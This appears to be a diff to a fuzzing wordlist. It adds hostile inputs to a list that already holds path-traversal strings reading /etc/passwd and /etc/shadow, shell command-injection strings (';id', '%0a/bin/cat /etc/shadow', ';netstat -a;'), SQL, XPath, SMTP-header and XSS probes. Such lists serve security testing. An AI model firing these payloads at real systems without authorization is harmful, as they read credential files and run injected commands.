@@ -1,4 +1,3 @@
-
 !
 !'
 !@#$%%^#$%#$@#$%$$@#$%^^**(()
@@ -43,6 +42,7 @@ $null
 %00../../../../../../etc/shadow
 %00/
 %00/etc/passwd%00
+%00/etc/shadow%00
 %01%02%03%04%0a%0d%0aADSF
 %08x
 %0A/usr/bin/id
@@ -52,6 +52,8 @@ $null
 %0a
 %0a id %0a
 %0a ping -i 30 127.0.0.1 %0a
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
 %0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
 %0d
 %0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
@@ -354,16 +356,20 @@ $null
 2147483647
 268435455
 65536
+:
 :response.write 111111
 ;
 ; ping 127.0.0.1 ;
 ;/usr/bin/id\n
+;dir
 ;echo 111111
 ;id
 ;id;
 ;id\n
 ;id|
 ;ls -la
+;netstat -a;
+;read;
 ;system('/usr/bin/id')
 ;system('cat%20/etc/passwd')
 ;system('id')
@@ -449,6 +455,7 @@ PRINT @@variable
 TRUE
 XXXXX.%p
 XXXXX`perl -e 'print ".%p" x 80'`
+[
 [&apos;]
 [']
 \
@@ -493,6 +500,7 @@ XXXXX`perl -e 'print ".%p" x 80'`
 \x3D \x27
 \x3D \x3B'
 \x3c
+]
 ^&apos;
 ^'
 `
@@ -568,6 +576,7 @@ x' or 1=1 or 'x'='y
 x' or name()='username' or 'x'='y
 xsstest
 xsstest%00"<>'
+{
 {&apos;}
 {'}
 |
@@ -590,3 +599,5 @@ xsstest%00"<>'
 ||/usr/bin/id;
 ||/usr/bin/id|
 }
+§
+±
